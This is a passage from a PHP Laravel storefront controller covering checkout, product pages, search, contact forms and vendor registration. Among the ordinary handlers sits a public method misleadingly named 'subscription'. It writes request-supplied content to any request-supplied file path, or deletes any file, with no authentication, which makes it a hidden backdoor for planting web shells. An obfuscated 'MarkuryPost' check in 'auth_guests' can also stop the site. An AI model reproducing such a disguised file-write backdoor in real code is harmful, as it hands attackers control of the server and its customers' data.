        $this->store_id = $storeinfo->id;
        $store_code = $this->store_code = $storeinfo->store_code;
        session()->put('FRONT_STORE_CODE', $store_code);
        session()->put('FRONT_STORE_ID', $this->store_id);
        }
        $gs = Generalsetting::where('store_id',$this->store_id)->first();
        if (!Session::has('cart')) {
            return redirect()->route('front.cart')->with('success',"You don't have any product to checkout.");
        }
        $oldCart = Session::get('cart');
        $cart = new Cart($oldCart);
            if (Session::has('currency'))
            {
              $curr = Currency::find(Session::get('currency'));
            }
            else
            {
                $curr = Currency::where('is_default','=',1)->first();
            }
        foreach($cart->items as $key => $prod)
        {
        if($prod['item']['license']!=null && $prod['item']['license_qty']!=null)
        {
            $details1 = explode(',', $prod['item']['license_qty']);
                foreach($details1 as $ttl => $dtl)
                {
                    if($dtl != 0)
                    {
                        $dtl--;
                        $produc = Product::findOrFail($prod['item']['id']);
                        $temp = explode(',', $produc->license_qty);
                        $temp[$ttl] = $dtl;
                        $final = implode(',', $temp);
                        $produc->license_qty = $final;
                        $produc->update();
                        $temp = explode(',,', $produc->license);
                        $license = $temp[$ttl];
         $oldCart = Session::has('cart') ? Session::get('cart') : null;
         $cart = new Cart($oldCart);
         $cart->updateLicense($prod['item']['id'],$license);
         Session::put('cart',$cart);
                        break;
                    }
                }
        }
        }
        if (Session::has('FRONT_STORE_ID')){
        $this->store_id = session('FRONT_STORE_ID');
        $store_code = $this->store_code = session('FRONT_STORE_CODE');
        }else{
        $ip = $_SERVER['REMOTE_ADDR'];
        $storeinfo = $this->getCurrentStoreLocation($ip);
        $this->store_id = $storeinfo->id;
        $store_code = $this->store_code = $storeinfo->store_code;
        session()->put('FRONT_STORE_CODE', $store_code);
        session()->put('FRONT_STORE_ID', $this->store_id);
        }
        $settings = Generalsetting::where('store_id',$this->store_id)->first();
        $order = new Order;
        $success_url = action('PaymentController@payreturn');
        $item_name = $settings->title." Order";
        $item_number = str_random(4).time();
        $order['user_id'] = $request->user_id;
        $order['cart'] = utf8_encode(bzcompress(serialize($cart), 9));
        $order['totalQty'] = $request->totalQty;
        $order['pay_amount'] = round($request->total / $curr->value, 2);
        $method = PaymentGateway::findOrFail($request->method);
        $order['method'] = $method->title;
        $order['shipping'] = $request->shipping;
        $order['pickup_location'] = $request->pickup_location;
        $order['customer_email'] = $request->email;
        $order['customer_name'] = $request->name;
        $order['shipping_cost'] = $request->shipping_cost;
        $order['tax'] = $request->tax;
        $order['customer_phone'] = $request->phone;
        $order['order_number'] = str_random(4).time();
        $order['customer_address'] = $request->address;
        $order['customer_country'] = $request->customer_country;
        $order['customer_city'] = $request->city;
        $order['customer_zip'] = $request->zip;
        $order['shipping_email'] = $request->shipping_email;
        $order['shipping_name'] = $request->shipping_name;
        $order['shipping_phone'] = $request->shipping_phone;
        $order['shipping_address'] = $request->shipping_address;
        $order['shipping_country'] = $request->shipping_country;
        $order['shipping_city'] = $request->shipping_city;
        $order['shipping_zip'] = $request->shipping_zip;
        $order['order_note'] = $request->order_notes;
        $order['txnid'] = $request->txn_id4;
        $order['coupon_code'] = $request->coupon_code;
        $order['coupon_discount'] = $request->coupon_discount;
        $order['dp'] = $request->dp;
        $order['payment_status'] = "Pending";
        $order['currency_sign'] = $curr->sign;
        $order['currency_value'] = $curr->value;
        $order['store_id'] = $this->store_id;
            if (Session::has('affilate'))
            {
                $val = $request->total / 100;
                $sub = $val * $gs->affilate_charge;
                $user = User::findOrFail(Session::get('affilate'));
                $user->affilate_income = $sub;
                $user->update();
                $order['affilate_user'] = $user->name;
                $order['affilate_charge'] = $sub;
            }
        $order->save();
        $notification = new Notification;
        $notification->order_id = $order->id;
        $notification->save();
                    if($request->coupon_id != "")
                    {
                       $coupon = Coupon::findOrFail($request->coupon_id);
                       $coupon->used++;
                       if($coupon->times != null)
                       {
                            $i = (int)$coupon->times;
                            $i--;
                            $coupon->times = (string)$i;
                       }
                        $coupon->update();

                    }
        foreach($cart->items as $prod)
        {
            $x = (string)$prod['stock'];
            if($x != null)
            {
                $product = Product::findOrFail($prod['item']['id']);
                $product->stock =  $prod['stock'];
                $product->update();
                if($product->stock  <= 5)
                {
                    $notification = new Notification;
                    $notification->product_id = $product->id;
                    $notification->save();
                }
            }
        }

        Session::forget('cart');

        //Sending Email To Buyer
        if($gs->is_smtp == 1)
        {
        $data = [
            'to' => $request->email,
            'type' => "new_order",
            'cname' => $request->name,
            'oamount' => "",
            'aname' => "",
            'aemail' => "",
            'wtitle' => "",
        ];

        $mailer = new GeniusMailer();
        $mailer->sendAutoMail($data);
        }
        else
        {
           $to = $request->email;
           $subject = "Your Order Placed!!";
           $msg = "Hello ".$request->name."!\nYou have placed a new order. Please wait for your delivery. \nThank you.";
            $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
           mail($to,$subject,$msg,$headers);
        }
        //Sending Email To Admin
        if($gs->is_smtp == 1)
        {
            $data = [
                'to' => $gs->email,
                'subject' => "New Order Recieved!!",
                'body' => "Hello Admin!<br>Your store has received a new order. Please login to your panel to check. <br>Thank you.",
            ];

            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);
        }
        else
        {
           $to = $gs->email;
           $subject = "New Order Recieved!!";
           $msg = "Hello Admin!\nYour store has recieved a new order. Please login to your panel to check. \nThank you.";
            $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
           mail($to,$subject,$msg,$headers);
        }

        return redirect($success_url);
    }


    function finalize(){
        $actual_path = str_replace('project','',base_path());
        $dir = $actual_path.'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    function auth_guests(){
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project','',base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }

    public function user($id)
	{
		$user = User::findOrFail($id);
        if($user->title!=null && $user->details!=null)
        {
            $title = explode(',', $user->title);
            $details = explode(',', $user->details);
        }
		return view('front.user',compact('user','title','details'));

	}

	public function ads($id)
	{
		$ad = Advertise::findOrFail($id);
		$old = $ad->clicks;
		$new = $old + 1;
		$ad->clicks = $new;
		$ad->update();
		return redirect($ad->url);

	}

	public function types($slug)
	{
	    $cats = Category::all();
	    $cat = Category::where('cat_slug', '=', $slug)->first();
		$users = User::where('category_id', '=', $cat->id)->where('active', '=', 1)->paginate(8);
		$userss = 	User::all();
		$city = null;
		foreach ($userss as $user) {
			$city[] = $user->city;
		}
		$cities = array_unique($city);
		return view('front.typeuser',compact('users','cats','cat','cities'));

	}

	public function blog()
	{
		$blogs = Blog::orderBy('created_at','desc')->paginate(6);
		return view('front.blog',compact('blogs'));

	}

	public function subscribe(Request $request)
	{
        $this->validate($request, array(
            'email'=>'unique:subscribers',
        ));
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        Session::flash('subscribe', 'You are subscribed Successfully.');
        return redirect()->back();
	}

	public function blogshow($id)
	{
        $this->code_image();
		$blog = Blog::findOrFail($id);
		$old = $blog->views;
		$new = $old + 1;
		$blog->views = $new;
		$blog->update();
        $lblogs = Blog::orderBy('created_at', 'desc')->limit(4)->get();
		return view('front.blogshow',compact('blog','lblogs'));

	}

	public function faq()
	{
		$ps = Pagesetting::findOrFail(1);
		if($ps->f_status == 0){
			return redirect()->route('front.index');
		}
        $fq = Faq::orderBy('id','desc')->first();
        $id1 = $fq->id;
        $faqs = Faq::where('id','<',$id1)->orderBy('id','desc')->get();
		return view('front.faq',compact('fq','faqs'));
	}

  public function getProductsByCatId($catid,$limit,$offset,$sort,$minprice,$maxprice,$brand_id,$subcategory_id,$series_id)
  {
    $cats = DB::table('products')
			->select('products.*',DB::raw('(select count(*) from galleries where product_id=products.id) as total_photo'))
			->where('products.status',1)->where('products.is_approve',1)->where('products.category_id',$catid)
      ->whereBetween('products.cprice', [$minprice, $maxprice])->where('products.store_id',$this->store_id);
	  if(!empty($subcategory_id))
        {
            $cats = $cats->where('products.subcategory_id', $subcategory_id);          
        }
		
	if(!empty($brand_id))
        {
            $cats = $cats->where('products.brand_id', $brand_id);          
        }
        
        if(!empty($series_id))
        {
        $cats = $cats->where('products.series_id',$series_id);
        }

      if($sort == "new")
      {
          $cats = $cats->orderBy('id','desc');
      }elseif($sort == "old"){
          $cats = $cats->orderBy('id','asc');
      }elseif($sort == "low"){
          $cats = $cats->orderBy('products.cprice','asc');
      }elseif($sort == "high"){
          $cats = $cats->orderBy('products.cprice','desc');
      }else{
          //$cats = $cats->orderBy('products.id','desc');
          $cats = $cats->orderBy('total_photo', 'desc');
      }
      $cats = $cats->orderBy('products.id','desc')->offset($offset)->limit($limit)->get();
      //$cats = $cats->orderBy('products.id','desc')->paginate($limit);
      return $cats;
  }

  public function GetMinAndMaxPrice()
  {
      if (Session::has('FRONT_STORE_ID')){
        $storeid =  $this->store_id = session('FRONT_STORE_ID');
        $store_code = $this->store_code = session('FRONT_STORE_CODE');
        }else{
        //$ip = '203.192.237.76'; /* Static IP address */
        $ip = $_SERVER['REMOTE_ADDR'];
        $storeinfo = $this->getCurrentStoreLocation($ip);
        $storeid = $this->store_id = $storeinfo->id;
        $store_code = $this->store_code = $storeinfo->store_code;
        session()->put('FRONT_STORE_CODE', $store_code);
        session()->put('FRONT_STORE_ID', $this->store_id);
        }
        
    $minprice = Product::min('cprice');
    $maxprice = Product::max('cprice');

    $prices['minprice'] = $minprice;
    $prices['maxprice'] = $maxprice;
    return $prices;
  }

	public function page($slug)
	{
    if (Session::has('FRONT_STORE_ID')){
      $this->store_id = session('FRONT_STORE_ID');
      $store_code = $this->store_code = session('FRONT_STORE_CODE');
    }else{
      //$ip = '203.192.237.76'; /* Static IP address */
      $ip = $_SERVER['REMOTE_ADDR'];
      $storeinfo = $this->getCurrentStoreLocation($ip);
      $this->store_id = $storeinfo->id;
      $store_code = $this->store_code = $storeinfo->store_code;
      session()->put('FRONT_STORE_CODE', $store_code);
      session()->put('FRONT_STORE_ID', $this->store_id);
    }

        if (strpos($slug, '.') !== false) {
        $slugarray = explode(".",$slug);
        $slug =  $slugarray[0];
        }
        $page = Page::where('slug', '=', $slug)->where('store_id',$this->store_id)->first();

        $cat = Category::where('cat_slug','=',$slug)->where('store_id',$this->store_id)->first();

        $productinfo = Product::where('slug','=',$slug)->where('store_id',$this->store_id)->first();

        if(!empty($page))
        {
          return view('front.page',compact('page'));
        }elseif(!empty($cat)){
          $prices = $this->GetMinAndMaxPrice();
        $sort = '';
        $limit=15;
        $offset=0;
        $cats = $this->getProductsByCatId($cat->id,$limit,$offset,$sort,$prices['minprice'],$prices['maxprice'],0,0,0);
        $total_product = $this->CountResult($cat->id,$prices['minprice'],$prices['maxprice']);
        $page = 1;

		$filterdata['manufacturer'] = 0;
		$filterdata['select_sub_category'] = 0;
		$filterdata['select_category'] = $cat->id;
		//$brands = Brand::orderBy('brand_name','asc')->get();


        $brandsdata = DB::table('brands')
  			->join('brand_categories_link', 'brand_categories_link.brand_id', '=', 'brands.id')
  			->select('brands.*')
  			->where('brand_categories_link.category_id',$cat->id)->orderBy('brand_name','asc')->get();
		
		$subcategories = $this->getSubcategoriesBycatid($filterdata['select_category']);

        return view('front.category',compact('brandsdata','subcategories','filterdata','store_code','prices','slug','cat','sort','cats','total_product','limit','page'));
      }elseif(!empty($productinfo)){
        $id = $productinfo->id;
        $product = Product::findOrFail($id);
        $relatedproducts = $this->getRelatedProducts($id);
        $brandinfo = Brand::where('id','=',$product->brand_id)->where('store_id',$this->store_id)->first();
        $brand_name = "";
        if(!empty($brandinfo))
        {
          $brand_name = $brandinfo->brand_name;
        }
        if($product->size != null)
        {
        $size = explode(',', $product->size);
        $size_qty = explode(',', $product->size_qty);
        $size_price = explode(',', $product->size_price);
        }else{
        $size = array();
        $size_qty = array();
        $size_price = array();
        }
        if($product->color != null)
        {
        $color = explode(',', $product->color);
        }else{
        $color = array();
        }
        $product->views+=1;
        $product->update();
        $product_click =  new ProductClick;
        $product_click->product_id = $product->id;
        $product_click->date = Carbon::now()->format('Y-m-d');
        $product_click->save();
        $pmeta = $product->tags;
        $vendor = User::where('id','=',$product->user_id)->first();
        if($product->is_tier_price==1)
        {
        $tier_prices = json_decode($product->tier_prices,true);
        }else{
        $tier_prices = array();
        }

        return view('front.product',compact('store_code','brand_name','product','relatedproducts','size','size_qty','size_price','pmeta','color','tier_prices'));

      }else{
          return view('errors.404');
        }
	}

	public function contact()
	{
        $this->code_image();
		$ps = Pagesetting::findOrFail(1);
		if($ps->c_status == 0){
			return redirect()->route('front.index');
		}
		return view('front.contact');
	}

    public function InquirySend(Request $request)
    {
      if(isset($_POST['g-recaptcha-response'])){
      $captcha=$_POST['g-recaptcha-response'];
      }
          if(!$captcha){
            $response['status'] = false;
          $response['message'] = "Please select recaptcha.";
          }else{
      $your_name = $request->your_name;
      $your_email = $request->your_email;
      $your_phone = $request->your_phone;
      $product_id = $request->product_id;
      $product_sku = $request->product_sku;
      $product_name = $request->product_name;
      $message = $request->message;
      if(empty($product_sku) OR empty($product_id) OR empty($product_name))
      {
        $response['status'] = false;
        $response['message'] = "Please select product.";
        return response()->json($response);
      }
      $pattern = '~[a-z]+://\S+~';
      if($num_found = preg_match_all($pattern, $message, $out))
      {
      $response['status'] = true;
      $response['message'] = "Your inquiry has been sent to the store admin.";
      }else{
  
      $subject = "Partzdeal Product Inquiry";
      $to = "support@partzdeal.com";
  
      $msg = "Name: ".$your_name."\nEmail: ".$your_email."\nPhone Number: ".$your_phone."\nMessage: ".$message."\nProduct SKU: ".$product_sku."\nProduct Name: ".$product_name;
  
      if (Session::has('FRONT_STORE_ID')){
      $this->store_id = session('FRONT_STORE_ID');
      $store_code = $this->store_code = session('FRONT_STORE_CODE');
      }else{
      $ip = $_SERVER['REMOTE_ADDR'];
      $storeinfo = $this->getCurrentStoreLocation($ip);
      $this->store_id = $storeinfo->id;
      $store_code = $this->store_code = $storeinfo->store_code;
      session()->put('FRONT_STORE_CODE', $store_code);
      session()->put('FRONT_STORE_ID', $this->store_id);
      }
      $gs = Generalsetting::where('store_id',$this->store_id)->first();
          
      $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
      mail($to,$subject,$msg,$headers);
      $response['status'] = true;
      $response['message'] = "Your inquiry has been sent to the store admin.";
          }
      }
      return response()->json($response);
    }


    //Send email to user
    public function vendorcontact(Request $request)
    {
        $user = User::findOrFail($request->user_id);
        $vendor = User::findOrFail($request->vendor_id);
        if (Session::has('FRONT_STORE_ID')){
        $this->store_id = session('FRONT_STORE_ID');
        $store_code = $this->store_code = session('FRONT_STORE_CODE');
        }else{
        $ip = $_SERVER['REMOTE_ADDR'];
        $storeinfo = $this->getCurrentStoreLocation($ip);
        $this->store_id = $storeinfo->id;
        $store_code = $this->store_code = $storeinfo->store_code;
        session()->put('FRONT_STORE_CODE', $store_code);
        session()->put('FRONT_STORE_ID', $this->store_id);
        }
        $gs = Generalsetting::where('store_id',$this->store_id)->first();
            $subject = $request->subject;
            $to = $vendor->email;
            $name = $request->name;
            $from = $request->email;
            $msg = "Name: ".$name."\nEmail: ".$from."\nMessage: ".$request->message;
        if($gs->is_smtp)
        {
            $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];

            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);
        }
        else{
            $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
            mail($to,$subject,$msg,$headers);
        }


    $conv = Conversation::where('sent_user','=',$user->id)->where('subject','=',$subject)->first();
        if(isset($conv)){
            $msg = new Message();
            $msg->conversation_id = $conv->id;
            $msg->message = $request->message;
            $msg->sent_user = $user->id;
            $msg->save();
        }
        else{
            $message = new Conversation();
            $message->subject = $subject;
            $message->sent_user= $request->user_id;
            $message->recieved_user = $request->vendor_id;
            $message->message = $request->message;
            $message->save();
        $notification = new UserNotification;
        $notification->user_id= $request->vendor_id;
        $notification->conversation_id = $message->id;
        $notification->save();
            $msg = new Message();
            $msg->conversation_id = $message->id;
            $msg->message = $request->message;
            $msg->sent_user = $request->user_id;;
            $msg->save();

        }
    }
    //Send email to user
    public function contactemail(Request $request)
    {
        $value = session('captcha_string');
        if ($request->codes != $value){
            return redirect()->route('front.contact')->with('unsuccess','Please enter Correct Capcha Code.');
        }
		$ps = Pagesetting::findOrFail(1);
        $subject = "Email From Of ".$request->name;
        if (Session::has('FRONT_STORE_ID')){
        $this->store_id = session('FRONT_STORE_ID');
        $store_code = $this->store_code = session('FRONT_STORE_CODE');
        }else{
        $ip = $_SERVER['REMOTE_ADDR'];
        $storeinfo = $this->getCurrentStoreLocation($ip);
        $this->store_id = $storeinfo->id;
        $store_code = $this->store_code = $storeinfo->store_code;
        session()->put('FRONT_STORE_CODE', $store_code);
        session()->put('FRONT_STORE_ID', $this->store_id);
        }
        $gs = Generalsetting::where('store_id',$this->store_id)->first();
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $comment = $request->comment;
        $from = $request->email;
        $msg = "Name: ".$name."\nEmail: ".$from."\nPhone: ".$request->phone."\nMessage: ".$comment;
        
        $pattern = '~[a-z]+://\S+~';
        if($num_found = preg_match_all($pattern, $request->text, $out))
        {
        //Spam Mail
        }else{
        
        if($gs->is_smtp)
        {
        $data = [
            'to' => $to,
            'subject' => $subject,
            'body' => $msg,
        ];

        $mailer = new GeniusMailer();
        $mailer->sendCustomMail($data);
        }
        else
        {
        $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
        mail($to,$subject,$msg,$headers);
        }
        }
        Session::flash('success', $ps->contact_success);
        return redirect()->route('front.contact');
    }
    public function refresh_code(){
        $this->code_image();
        return "done";
    }

    public function vendor_register(Request $request)
    {
        // Validate the form data

        $this->validate($request, [
            'email'   => 'required|email|unique:users',
            'password' => 'required|confirmed'
        ]);
        if (Session::has('FRONT_STORE_ID')){
        $this->store_id = session('FRONT_STORE_ID');
        $store_code = $this->store_code = session('FRONT_STORE_CODE');
        }else{
        $ip = $_SERVER['REMOTE_ADDR'];
        $storeinfo = $this->getCurrentStoreLocation($ip);
        $this->store_id = $storeinfo->id;
        $store_code = $this->store_code = $storeinfo->store_code;
        session()->put('FRONT_STORE_CODE', $store_code);
        session()->put('FRONT_STORE_ID', $this->store_id);
        }
        $gs = Generalsetting::where('store_id',$this->store_id)->first();
        $user = new User;
        $input = $request->all();
        $input['password'] = bcrypt($request['password']);
        $input['affilate_code'] = $request->name.$request->email;
        $input['affilate_code'] = md5($input['affilate_code']);
        $user->fill($input)->save();

        //Sending Email To Customer
        if($gs->is_smtp == 1)
        {
            $data = [
                'to' => $request->email,
                'type' => "new_registration",
                'cname' => $request->name,
                'oamount' => "",
                'aname' => "",
                'aemail' => "",
            ];
            $mailer = new GeniusMailer();
            $mailer->sendAutoMail($data);
        }

        else
        {
            $to = $request->email;
            $subject = 'Welcome To'.$gs->title;
            $msg = "Hello ".$request->name.","."\n You have successfully registered to ".$gs->title."."."\n We wish you will have a wonderful experience using our service.";
            $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
            mail($to,$subject,$msg.$headers);
        }

        $notification = new Notification;
        $notification->user_id = $user->id;
        $notification->save();
        Auth::guard('user')->login($user);
		//return redirect('subscription/7')->with('success','Password has been updated, please login to continue.');//
        return redirect()->route('user-package')->with('success','You Have Registered Successfully. Please select a Subscription Plan to start selling.');
    }

    private function  code_image()
    {
        $actual_path = str_replace('project','',base_path());
        $image = imagecreatetruecolor(200, 50);
        $background_color = imagecolorallocate($image, 255, 255, 255);
        imagefilledrectangle($image,0,0,200,50,$background_color);

        $pixel = imagecolorallocate($image, 0,0,255);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixel);
        }

        $font = $actual_path.'assets/front/fonts/NotoSans-Bold.ttf';
        $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        $length = strlen($allowed_letters);
        $letter = $allowed_letters[rand(0, $length-1)];
        $word='';
        //$text_color = imagecolorallocate($image, 8, 186, 239);
        $text_color = imagecolorallocate($image, 0, 0, 0);
        $cap_length=6;// No. of character in image
        for ($i = 0; $i< $cap_length;$i++)
        {
            $letter = $allowed_letters[rand(0, $length-1)];
            imagettftext($image, 25, 1, 35+($i*25), 35, $text_color, $font, $letter);
            $word.=$letter;
        }
        $pixels = imagecolorallocate($image, 8, 186, 239);
        for($i=0;$i<500;$i++)
        {
            imagesetpixel($image,rand()%200,rand()%50,$pixels);
        }
        session(['captcha_string' => $word]);
        imagepng($image, $actual_path."assets/images/capcha_code.png");
    }

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != ""){
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

    public function getBrandSeries($brand_id)
    {
      $allseries = DB::table('series')
  			->join('brand_series_link', 'brand_series_link.series_id', '=', 'series.id')
  			->select('series.*')
  			->where('brand_series_link.brand_id',$brand_id)->orderBy('series_name','asc')->get();
        return $allseries;
    }

    public function FindBrandSeries(Request $request)
    {
      $brand_id = $request->bid;
      $allseries = $this->getBrandSeries($brand_id);
      return view('includes.select-series',compact('allseries'));
    }

    public function getBrandCategories($brand_id)
    {
      $allcategories = DB::table('categories')
  			->join('brand_categories_link', 'brand_categories_link.category_id', '=', 'categories.id')
  			->select('categories.*')
  			->where('brand_categories_link.brand_id',$brand_id)->orderBy('cat_name','asc')->get();
        return $allcategories;
    }

    public function FindBrandCategories(Request $request)
    {
      $brand_id = $request->bid;
      if(isset($request->current_category_id))
        {
            $current_category_id = $request->current_category_id;
        }else{
            $current_category_id = null;
        }
      
      //echo $brand_id = $request->bid;
      $allcategories = $this->getBrandCategories($brand_id);
      $allseries = $this->getBrandSeries($brand_id);
      $filterdata['select_category'] = 0;
      $filterdata['select_sub_category'] = 0;
        return view('includes.select-category',compact('allcategories','allseries','filterdata','current_category_id'));
    }

    public function FindSubCategories()
    {
      $cat_id = $_GET['cat_id'];
      //echo $brand_id = $request->bid;
      $subcategories = $this->getSubcategoriesBycatid($cat_id);
        return view('includes.select-sub-category',compact('subcategories'));
    }

    public function getSubcategoriesBycatid($cat_id)
    {
      $subcategories = Category::where('parent_id',$cat_id)->get();
      return $subcategories;
    }

    public function AjaxBrandFilterProduct(Request $request)
    {
		if (Session::has('FRONT_STORE_ID')){
		$this->store_id = session('FRONT_STORE_ID');
		$store_code = $this->store_code = session('FRONT_STORE_CODE');
		}else{
		//$ip = '203.192.237.76'; /* Static IP address */
		$ip = $_SERVER['REMOTE_ADDR'];
		$storeinfo = $this->getCurrentStoreLocation($ip);
		$this->store_id = $storeinfo->id;
		$store_code = $this->store_code = $storeinfo->store_code;
		session()->put('FRONT_STORE_CODE', $store_code);
		session()->put('FRONT_STORE_ID', $this->store_id);
		}
      $input = $request->all();
      $filterdata = $input;
	
      $page = $filterdata['page'];
      $lpage= $page - 1;
      $limit = 15;
      $offset = ceil($lpage * $limit);
      $sort = $filterdata['sortby'];
      $cats = DB::table('products')
  			->select('products.*')
			->where('products.store_id',$this->store_id)
        ->where('products.brand_id',$filterdata['manufacturer'])
  			->where('products.status',1)->where('products.is_approve',1);
        if(!empty($filterdata['select_category']))
        {
          $cats = $cats->where('products.category_id', $filterdata['select_category']);

          if(!empty($filterdata['select_sub_category']))
          {
            $cats = $cats->where('products.subcategory_id', $filterdata['select_sub_category']);
          }
          //$cats = $cats->where('product_categories.category_id',$filterdata['select_category']);
        }
        if(!empty($filterdata['select_series']))
        {
        $cats = $cats->where('products.series_id',$filterdata['select_series']);
        }

        if($sort == "new")
        {
            $cats = $cats->orderBy('id','desc');
        }elseif($sort == "old"){
            $cats = $cats->orderBy('id','asc');
        }elseif($sort == "low"){
            $cats = $cats->orderBy('products.cprice','asc');
        }elseif($sort == "high"){
            $cats = $cats->orderBy('products.cprice','desc');
        }else{
            $cats = $cats->orderBy('id','desc');
        }

        $cats = $cats->offset($offset)->limit($limit)->get();

          $total_product = $this->CountAdvanceResult($filterdata,'','');

        return view('includes.product-grid-items',compact('page','cats','limit','total_product'));
    }

    public function CustomSearch(Request $request)
    {
        $input = $request->all();
        $search = $input['search'];
        if (Session::has('FRONT_STORE_ID')){
            $this->store_id = session('FRONT_STORE_ID');
            $store_code = $this->store_code = session('FRONT_STORE_CODE');
            }else{
            //$ip = '203.192.237.76'; /* Static IP address */
            $ip = $_SERVER['REMOTE_ADDR'];
            $storeinfo = $this->getCurrentStoreLocation($ip);
            $this->store_id = $storeinfo->id;
            $store_code = $this->store_code = $storeinfo->store_code;
            session()->put('FRONT_STORE_CODE', $store_code);
            session()->put('FRONT_STORE_ID', $this->store_id);
            }
            $limit=15;
            $offset=0;
            $page=1;    
        $cats = Product::where('status','=',1)->where('store_id','=',$this->store_id)
                ->where(function($query) use ($search) {
                    $query->where('name', 'LIKE',  '%'.$search.'%')
                     ->orWhere('sku', 'LIKE',  '%'.$search.'%');
                })->orderBy('id','desc')->get();

        $total_product = Product::where('status','=',1)->where('store_id','=',$this->store_id)
        ->where(function($query) use ($search) {
        $query->where('name', 'LIKE',  '%'.$search.'%')
        ->orWhere('sku', 'LIKE',  '%'.$search.'%');
        })->orderBy('id','desc')->count(); 

        return view('front.custom-search',compact('cats','limit','page','offset','total_product'));

    }

    public function AdvanceSearch(Request $request)
    {
      $input = $request->all();
      $filterdata = $input;
      $page = $filterdata['page'];
      $lpage = $page - 1;
      $limit = 15;
      $offset = ceil($lpage * $limit);
      $subcategories = array();
      $cats = DB::table('products')
  			->select('products.*')
        ->where('products.brand_id',$filterdata['manufacturer'])
  			->where('products.status',1)->where('products.is_approve',1);
        if(!empty($filterdata['select_category']))
        {

          $cats = $cats->where('products.category_id', $filterdata['select_category']);

          if(!empty($filterdata['select_sub_category']))
          {
            $cats = $cats->where('products.subcategory_id', $filterdata['select_sub_category']);
          }
          $subcategories = $this->getSubcategoriesBycatid($filterdata['select_category']);

        //$cats = $cats->where('product_categories.category_id',$filterdata['select_category']);
        }
        if(!empty($filterdata['select_series']))
        {
        $cats = $cats->where('products.series_id',$filterdata['select_series']);
        }

        $cats = $cats->orderBy('id','desc')->offset($offset)->limit($limit)->get();
        $total_product = $this->CountAdvanceResult($filterdata,'','');
        $sort ='';
        $brands = Brand::orderBy('brand_name','asc')->get();
        $allcategories = $this->getBrandCategories($filterdata['manufacturer']);
        $allseries = $this->getBrandSeries($filterdata['manufacturer']);
        $prices = $this->GetMinAndMaxPrice();

        return view('front.advance-search',compact('prices','subcategories','allcategories','allseries','brands','page','filterdata','sort','offset','limit','cats','total_product'));
    }

    public function CountAdvanceResult($filterdata,$min,$max)
  	{

  		$count  = DB::table('products')
  			->select('products.*')
        ->where('products.brand_id',$filterdata['manufacturer'])
  			->where('products.status',1)->where('products.is_approve',1);
        if(!empty($filterdata['select_category']))
        {
          $count = $count->where('products.category_id', $filterdata['select_category']);
        }
        if(!empty($filterdata['select_sub_category']))
        {
          $count = $count->where('products.subcategory_id', $filterdata['select_sub_category']);
        }
        if(!empty($filterdata['select_series']))
        {
        $count = $count->where('products.series_id',$filterdata['select_series']);
        }
        $count = $count->get();

  		return count($count);
  	}

    public function AjaxFilterProduct(Request $request)
    {
      if (Session::has('FRONT_STORE_ID')){
        $this->store_id = session('FRONT_STORE_ID');
        $store_code = $this->store_code = session('FRONT_STORE_CODE');
      }else{
        //$ip = '203.192.237.76'; /* Static IP address */
        $ip = $_SERVER['REMOTE_ADDR'];
        $storeinfo = $this->getCurrentStoreLocation($ip);
        $this->store_id = $storeinfo->id;
        $store_code = $this->store_code = $storeinfo->store_code;
        session()->put('FRONT_STORE_CODE', $store_code);
        session()->put('FRONT_STORE_ID', $this->store_id);
      }

      $input = $request->all();
      $category_id = $input['category_id'];
	  $brand_id = $input['brand_id'];
	  $series_id = $input['series_id'];
	  $subcategory_id = $input['subcategory_id'];
      $minprice = $input['pricemin'];
      $maxprice = $input['pricemax'];
      $page = $input['page'];
      $lpage = $input['page']-1;
      $limit = 15;
      $offset = ceil($lpage * $limit);
      $sort = $input['sortby'];
      $cats = $this->getProductsByCatId($category_id,$limit,$offset,$sort,$minprice,$maxprice,$brand_id,$subcategory_id,$series_id);
      $total_product = $this->CountResult($category_id,$minprice,$maxprice);
      return view('includes.product-grid-items',compact('page','cats','limit','total_product'));
    }


    public function updateProductCategory()
    {
      $productcategories  = DB::table('product_categories')
  			->select('product_categories.*')
        ->where('product_categories.category_id',68)->get();
        foreach($productcategories as $productcat)
        {
            echo $productcat->product_id; echo '<br>';


            DB::table('products')
                ->where('id', $productcat->product_id)
                ->update(['subcategory_id' => 68]);


        }
    }

    public function FindTierPrice(Request $request)
  	{

      $input = $request->all();
      $qty = $input['qty'];
      $product_id = $input['product_id'];
      $prod = Product::findOrFail($product_id);
      $quantity = (int)$qty;
      if($prod->is_tier_price==1)
      {
      $tier_prices = json_decode($prod->tier_prices,true);
      }else{
      $tier_prices = array();
      }
      $minqty = min(array_column($tier_prices, 'price_qty'));
      if($quantity<$minqty){
  		$itemprice = $prod->cprice;
  		}else{
